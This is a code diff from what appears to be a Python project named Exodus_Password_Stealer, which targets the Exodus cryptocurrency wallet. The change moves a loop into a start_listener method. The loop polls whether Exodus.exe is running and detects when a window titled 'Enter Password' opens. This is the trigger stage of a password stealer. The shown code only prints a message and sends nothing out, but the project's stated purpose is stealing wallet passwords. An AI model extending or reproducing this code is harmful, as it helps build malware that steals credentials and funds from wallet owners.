@@ -18,15 +18,17 @@ class Exodus_Password_Stealer:
         
     def current_active_window(self) -> dict[str]:
         return Current_Window.fetch_one()
+    
+    def start_listener(self):
+        while True:
+            if self.check_if_running() == True:
+                current_active_window: dict[str] = self.current_active_window()
+                
+                if current_active_window["title"] == "Enter Password":
+                    print("exodus login screen is open")
+                
+                time.sleep(0.5)
         
 if __name__ == "__main__":
     Stealer_Object: object = Exodus_Password_Stealer("Exodus.exe")
-    
-    while True:
-        if Stealer_Object.check_if_running() == True:
-            current_active_window: dict[str] = Stealer_Object.current_active_window()
-            
-            if current_active_window["title"] == "Enter Password":
-                print("exodus login screen is open")
-            
-            time.sleep(0.5)
+    Stealer_Object.start_listener()
